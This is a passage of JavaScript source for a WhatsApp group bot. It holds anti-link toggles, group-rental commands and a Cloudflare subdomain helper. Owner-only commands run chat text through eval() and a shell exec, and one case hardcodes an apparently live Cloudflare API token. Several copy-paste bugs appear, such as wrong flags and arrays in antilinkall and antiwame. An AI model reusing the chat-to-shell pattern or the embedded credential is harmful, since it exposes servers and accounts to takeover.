        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hai ${pushname}\nSilakan klik tombol di bawah untuk menggunakan _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './node_modules/Arisu-MD/data/image/thumb.jpg' } }, { upload: RyuuBotz.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"PILIH ON/OFF ♨️",
                "sections":[{
                  "title":"PILIH ON/OFF ",
                  "rows":[{
                    "header":"HIDUPKAN ✅",
                    "title":"MEMILIH ",
                    "description":"MENGHIDUPKAN ✅",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"MEMATIKAN ❌",
                    "title":"MEMILIH ",
                    "description":"MEMATIKAN ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        }),
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '120363419382206255@newsletter',
            newsletterName: ownername,
            serverMessageId: 143
          }
        }
      })
    }
  }
}, { quoted: m });

await RyuuBotz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
  break
          case 'antilinktelegram': case 'antilinktg': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins && !isRyuuTheCreator) return reply('Khusus Admin!!')
if (args[0] === "on") {
if (AntiLinkTelegram) return replyReinzID('Already activated')
ntilinktg.push(from)
fs.writeFileSync('./node_modules/Arisu-MD/database/antilinktelegram.json', JSON.stringify(ntilinktg))
replyReinzID('Success in turning on telegram antilink in this group')
var groupe = await RyuuBotz.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
RyuuBotz.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the telegram link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTelegram) return replyReinzID('Already deactivated')
let off = ntilinktg.indexOf(from)
ntilinktg.splice(off, 1)
fs.writeFileSync('./node_modules/Arisu-MD/database/antilinktelegram.json', JSON.stringify(ntilinktg))
replyReinzID('Success in turning off telegram antilink in this group')
} else {
  let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hai ${pushname}\nSilakan klik tombol di bawah untuk menggunakan _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './node_modules/Arisu-MD/data/image/thumb.jpg' } }, { upload: RyuuBotz.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"PILIH ON/OFF ♨️",
                "sections":[{
                  "title":"PILIH ON/OFF ",
                  "rows":[{
                    "header":"HIDUPKAN ✅",
                    "title":"MEMILIH ",
                    "description":"MENGHIDUPKAN ✅",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"MEMATIKAN ❌",
                    "title":"MEMILIH ",
                    "description":"MEMATIKAN ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        }),
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '120363419382206255@newsletter',
            newsletterName: ownername,
            serverMessageId: 143
          }
        }
      })
    }
  }
}, { quoted: m });

await RyuuBotz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
  break
            case 'antilinktiktok': case 'antilinktt': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins && !isRyuuTheCreator) return reply('Khusus Admin!!')
if (args[0] === "on") {
if (AntiLinkTiktok) return replyReinzID('Already activated')
ntilinktt.push(from)
fs.writeFileSync('./node_modules/Arisu-MD/database/antilinktiktok.json', JSON.stringify(ntilinktt))
replyReinzID('Success in turning on tiktok antilink in this group')
var groupe = await RyuuBotz.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
RyuuBotz.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the tiktok link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTiktok) return replyReinzID('Already deactivated')
let off = ntilinktt.indexOf(from)
ntilinktt.splice(off, 1)
fs.writeFileSync('./node_modules/Arisu-MD/database/antilinktiktok.json', JSON.stringify(ntilinktt))
replyReinzID('Success in turning off tiktok antilink in this group')
} else {
  let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hai ${pushname}\nSilakan klik tombol di bawah untuk menggunakan _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './node_modules/Arisu-MD/data/image/thumb.jpg' } }, { upload: RyuuBotz.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"PILIH ON/OFF ♨️",
                "sections":[{
                  "title":"PILIH ON/OFF ",
                  "rows":[{
                    "header":"HIDUPKAN ✅",
                    "title":"MEMILIH ",
                    "description":"MENGHIDUPKAN ✅",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"MEMATIKAN ❌",
                    "title":"MEMILIH ",
                    "description":"MEMATIKAN ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        }),
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '120363419382206255@newsletter',
            newsletterName: ownername,
            serverMessageId: 143
          }
        }
      })
    }
  }
}, { quoted: m });

await RyuuBotz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
  break
            case 'antilinktwt': case 'antilinktwitter': case 'antilinktwit': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins && !isRyuuTheCreator) return reply('Khusus Admin!!')
if (args[0] === "on") {
if (AntiLinkTwitter) return replyReinzID('Already activated')
ntilinktwt.push(from)
fs.writeFileSync('./node_modules/Arisu-MD/database/antilinktwitter.json', JSON.stringify(ntilinktwt))
replyReinzID('Success in turning on twitter antilink in this group')
var groupe = await RyuuBotz.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
RyuuBotz.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the twitter link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTwitter) return replyReinzID('Already deactivated')
let off = ntilinktwt.indexOf(from)
ntilinktwt.splice(off, 1)
fs.writeFileSync('./node_modules/Arisu-MD/database/antilinktwitter.json', JSON.stringify(ntilinktwt))
replyReinzID('Success in turning off twitter antilink in this group')
} else {
  let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hai ${pushname}\nSilakan klik tombol di bawah untuk menggunakan _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './node_modules/Arisu-MD/data/image/thumb.jpg' } }, { upload: RyuuBotz.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"PILIH ON/OFF ♨️",
                "sections":[{
                  "title":"PILIH ON/OFF ",
                  "rows":[{
                    "header":"HIDUPKAN ✅",
                    "title":"MEMILIH ",
                    "description":"MENGHIDUPKAN ✅",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"MEMATIKAN ❌",
                    "title":"MEMILIH ",
                    "description":"MEMATIKAN ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        }),
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '120363419382206255@newsletter',
            newsletterName: ownername,
            serverMessageId: 143
          }
        }
      })
    }
  }
}, { quoted: m });

await RyuuBotz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
  break
              case 'antilinkall': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins && !isRyuuTheCreator) return reply('Khusus Admin!!')
if (args[0] === "on") {
if (AntiLinkTwitter) return replyReinzID('Already activated')
ntilinkall.push(from)
fs.writeFileSync('./node_modules/Arisu-MD/database/antilinkall.json', JSON.stringify(ntilinkall))
replyReinzID('Success in turning on all antilink in this group')
var groupe = await RyuuBotz.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
RyuuBotz.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send any link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkAll) return replyReinzID('Already deactivated')
let off = ntilinkall.indexOf(from)
ntilinkall.splice(off, 1)
fs.writeFileSync('./node_modules/Arisu-MD/database/antilinkall.json', JSON.stringify(ntilinkall))
replyReinzID('Success in turning off all antilink in this group')
} else {
  let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hai ${pushname}\nSilakan klik tombol di bawah untuk menggunakan _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './node_modules/Arisu-MD/data/image/thumb.jpg' } }, { upload: RyuuBotz.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"PILIH ON/OFF ♨️",
                "sections":[{
                  "title":"PILIH ON/OFF ",
                  "rows":[{
                    "header":"HIDUPKAN ✅",
                    "title":"MEMILIH ",
                    "description":"MENGHIDUPKAN ✅",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"MEMATIKAN ❌",
                    "title":"MEMILIH ",
                    "description":"MEMATIKAN ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        }),
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '120363419382206255@newsletter',
            newsletterName: ownername,
            serverMessageId: 143
          }
        }
      })
    }
  }
}, { quoted: m });

await RyuuBotz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
  break
case 'antitoxic': case 'antibadword': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins && !isRyuuTheCreator) return reply('Khusus Admin!!')
if (args[0] === "on") {
if (antiToxic) return replyReinzID('Aman, sudah aktif kok')
nttoxic.push(from)
fs.writeFileSync('./node_modules/Arisu-MD/database/antitoxic.json', JSON.stringify(nttoxic))
replyReinzID('Okeyy, sudah diaktifkan')
var groupe = await RyuuBotz.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
RyuuBotz.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nSiapa pun yang berkata kasar di grup ini, pesannya akan di hapus oleh arisu!!😠`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiToxic) return replyReinzID('Sudah nonaktif kok')
let off = nttoxic.indexOf(from)
nttoxic.splice(off, 1)
fs.writeFileSync('./node_modules/Arisu-MD/database/antitoxic.json', JSON.stringify(nttoxic))
replyReinzID('Okeyyy siapp')
} else {
  let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hai ${pushname}\nSilakan klik tombol di bawah untuk menggunakan _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './node_modules/Arisu-MD/data/image/thumb.jpg' } }, { upload: RyuuBotz.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"PILIH ON/OFF ♨️",
                "sections":[{
                  "title":"PILIH ON/OFF ",
                  "rows":[{
                    "header":"HIDUPKAN ✅",
                    "title":"MEMILIH ",
                    "description":"MENGHIDUPKAN ✅",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"MEMATIKAN ❌",
                    "title":"MEMILIH ",
                    "description":"MEMATIKAN ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        }),
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '120363419382206255@newsletter',
            newsletterName: ownername,
            serverMessageId: 143
          }
        }
      })
    }
  }
}, { quoted: m });

await RyuuBotz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
  break
case 'antiwame': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins && !isRyuuTheCreator) return reply('Khusus Admin!!')
if (args[0] === "on") {
if (Antilinkch) return replyReinzID('Already activated')
ntwame.push(from)
fs.writeFileSync('./node_modules/Arisu-MD/database/antiwame.json', JSON.stringify(ntwame))
replyReinzID('Success in turning on antiwame in this group')
var groupe = await RyuuBotz.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
RyuuBotz.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to send group link in this group, one who sends will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!Antiwame) return replyReinzID('Already deactivated')
let off = ntlinkch.indexOf(from)
ntwame.splice(off, 1)
fs.writeFileSync('./node_modules/Arisu-MD/database/antilinkch.json', JSON.stringify(ntlinkch))
replyReinzID('Success in turning off antiwame in this group')
} else {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hai ${pushname}\nSilakan klik tombol di bawah untuk menggunakan _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './node_modules/Arisu-MD/data/image/thumb.jpg' } }, { upload: RyuuBotz.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"PILIH ON/OFF ♨️",
                "sections":[{
                  "title":"PILIH ON/OFF ",
                  "rows":[{
                    "header":"HIDUPKAN ✅",
                    "title":"MEMILIH ",
                    "description":"MENGHIDUPKAN ✅",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"MEMATIKAN ❌",
                    "title":"MEMILIH ",
                    "description":"MEMATIKAN ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        }),
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '120363419382206255@newsletter',
            newsletterName: ownername,
            serverMessageId: 143
          }
        }
      })
    }
  }
}, { quoted: m });

await RyuuBotz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
  break
case 'addsewa': {
    try {
        if (!isRyuuTheCreator) {
            return reply("Fitur ini hanya untuk Pacarku Reinzz");
        }
        if (!text || text.split(' ').length < 2) {
            return reply(
                `Gunakan dengan cara ${prefix + command} *linkgc waktu*\n\n` +
                `Contoh: ${command} https://chat.whatsapp.com/JanPql7MaMLa 30d\n\n` +
                `*CATATAN:*\n` +
                `d = hari (day)\n` +
                `m = menit (minute)\n` +
                `s = detik (second)\n` +
                `y = tahun (year)\n` +
                `h = jam (hour)`
            );
        }
        const [link, waktu] = text.split(' ');
        if (!isUrl(link) || !link.includes('https://chat.whatsapp.com/')) {
            return reply("Link grup WhatsApp tidak valid!");
        }
        if (!waktu) {
            return reply("Harap tentukan durasi waktu untuk sewa!");
        }
        const groupId = link.split('https://chat.whatsapp.com/')[1];
        const groupData = await RyuuBotz.groupAcceptInvite(groupId);
        if (checkSewaGroup(groupData, sewa)) {
            return reply("Bot sudah disewa oleh grup tersebut!");
        }
        addSewaGroup(groupData, waktu, sewa);
        reply("Berhasil menambahkan sewa grup dengan waktu tertentu!");
    } catch (error) {
        console.error("Error in 'addsewa' command:", error);
        reply("Terjadi kesalahan saat memproses permintaan. Silakan coba lagi.");
    }
}
break
case 'delsewa':{
            if (!isRyuuTheCreator) return reply("Fitur khusus owner!")
            if (!m.isGroup) return reply(`Perintah ini hanya bisa dilakukan di Grup yang menyewa bot`)
            if (!isSewa) return reply(`Bot tidak disewa di Grup ini`)
            sewa.splice(getSewaPosition(m.chat, sewa), 1)
            fs.writeFileSync('./node_modules/Arisu-MD/database/sewa.json', JSON.stringify(sewa, null, 2))
            reply(`Sukses del sewa di grup ini`)
			}
break
case 'listsewa':{
            let list_sewa_list = `*✨✨LIST SEWA✨✨*\n\n*Total:* ${sewa.length}\n\n`
            let data_array = [];
            for (let x of sewa) {
                list_sewa_list += `*Name:* ${await getGcName(x.id)}\n*ID :* ${x.id}\n`
                if (x.expired === 'PERMANENT') {
                    let ceksewa = 'PERMANENT'
                    list_sewa_list += `*Expire :* PERMANENT\n\n`
                } else {
                    let ceksewa = x.expired - Date.now()
                    list_sewa_list += `*Expired :* ${msToDate(ceksewa)}\n\n`
                }
            }
            RyuuBotz.sendMessage(m.chat, { text: list_sewa_list }, { quoted: m })
        }
break
case 'ceksewa':{
            let list_sewa_list = `*CEK SEWA*\n\n*Total:* ${sewa.length}\n\n`
            let data_array = [];
            for (let x of sewa) {
                list_sewa_list += `*Name:* ${await getGcName(x.id)}\n*ID :* ${x.id}\n`
                if (x.expired === 'PERMANENT') {
                    let ceksewa = 'PERMANENT'
                    list_sewa_list += `*Expire :* PERMANENT\n\n`
                } else {
                    let ceksewa = x.expired - Date.now()
                    list_sewa_list += `*Expired :* ${msToDate(ceksewa)}\n\n`
                }
            }
            RyuuBotz.sendMessage(m.chat, { text: list_sewa_list }, { quoted: m })
        }
break
case '=>': {
    if (!isRyuuTheCreator) return replyryuu('Fitur ini hanya bisa digunakan oleh pemilik bot, sayang~')
    try {
        let evaled = await eval(`(async () => { ${text} })()`)
        let teks = typeof evaled === 'string' ? evaled : require('util').inspect(evaled)
        replyryuu(teks)
    } catch (err) {
        replyryuu(String(err))
    }
}
break;
case '>': {
    if (!isRyuuTheCreator) return replyryuu('Fitur ini hanya bisa digunakan oleh pemilik bot, sayang~')
    try {
        let evaled = await eval(text)
        let teks = typeof evaled === 'string' ? evaled : require('util').inspect(evaled)
        replyryuu(teks)
    } catch (err) {
        replyryuu(String(err))
    }
}
break;
case '$': {
    if (!isRyuuTheCreator) return replyryuu('Fitur ini hanya bisa digunakan oleh pemilik bot, sayang~')
    exec(text, (err, stdout) => {
        if (err) return replyryuu(err)
        if (stdout) return replyryuu(stdout)
    })
}
break;
case 'antilinkch': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins && !isRyuuTheCreator) return reply('Khusus Admin!!')
if (args[0] === "on") {
if (Antilinkch) return replyReinzID('Already activated')
ntlinkch.push(from)
fs.writeFileSync('./node_modules/Arisu-MD/database/antilinkch.json', JSON.stringify(ntlinkch))
replyReinzID('Success in turning on antiwame in this group')
var groupe = await RyuuBotz.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
RyuuBotz.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to send group link in this group, one who sends will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!Antilinkch) return replyReinzID('Already deactivated')
let off = ntlinkch.indexOf(from)
ntlinkch.splice(off, 1)
fs.writeFileSync('./node_modules/Arisu-MD/database/antilinkch.json', JSON.stringify(ntlinkch))
replyReinzID('Success in turning off antiwame in this group')
} else {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hai ${pushname}\nSilakan klik tombol di bawah untuk menggunakan _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './node_modules/Arisu-MD/data/image/thumb.jpg' } }, { upload: RyuuBotz.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"PILIH ON/OFF ♨️",
                "sections":[{
                  "title":"PILIH ON/OFF ",
                  "rows":[{
                    "header":"HIDUPKAN ✅",
                    "title":"MEMILIH ",
                    "description":"MENGHIDUPKAN ✅",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"MEMATIKAN ❌",
                    "title":"MEMILIH ",
                    "description":"MEMATIKAN ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        }),
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '120363419382206255@newsletter',
            newsletterName: ownername,
            serverMessageId: 143
          }
        }
      })
    }
  }
}, { quoted: m });

await RyuuBotz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
  break
case 'antilink':
case 'antilinkgc': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins && !isRyuuTheCreator) return reply('Khusus Admin!!')
if (args[0] === "on") {
if (Antilinkgc) return replyReinzID('Already activated')
ntlinkgc.push(from)
fs.writeFileSync('./node_modules/Arisu-MD/database/antilinkgc.json', JSON.stringify(ntlinkgc))
replyReinzID('Success in turning on antiwame in this group')
var groupe = await RyuuBotz.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
RyuuBotz.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to send group link in this group, one who sends will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!Antilinkgc) return replyReinzID('Already deactivated')
let off = ntlinkgc.indexOf(from)
ntlinkgc.splice(off, 1)
fs.writeFileSync('./node_modules/Arisu-MD/database/antilinkgc.json', JSON.stringify(ntlinkgc))
replyReinzID('Success in turning off antiwame in this group')
} else {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hai ${pushname}\nSilakan klik tombol di bawah untuk menggunakan _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './node_modules/Arisu-MD/data/image/thumb.jpg' } }, { upload: RyuuBotz.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"PILIH ON/OFF ♨️",
                "sections":[{
                  "title":"PILIH ON/OFF ",
                  "rows":[{
                    "header":"HIDUPKAN ✅",
                    "title":"MEMILIH ",
                    "description":"MENGHIDUPKAN ✅",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"MEMATIKAN ❌",
                    "title":"MEMILIH ",
                    "description":"MEMATIKAN ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        }),
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '120363419382206255@newsletter',
            newsletterName: ownername,
            serverMessageId: 143
          }
        }
      })
    }
  }
}, { quoted: m });

await RyuuBotz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
  break
case 'domain20': {
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "f2bc5ee0d4471aa74dd689c297c7aa43";
               let apitoken = "cTJzNrTtWoTkj9d-LueQAnBtgVA4-3MZMUc9bTgE";
               let tld = "panellofficial.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyReinzID("PENGGUNAAN .domain4 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyReinzID("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
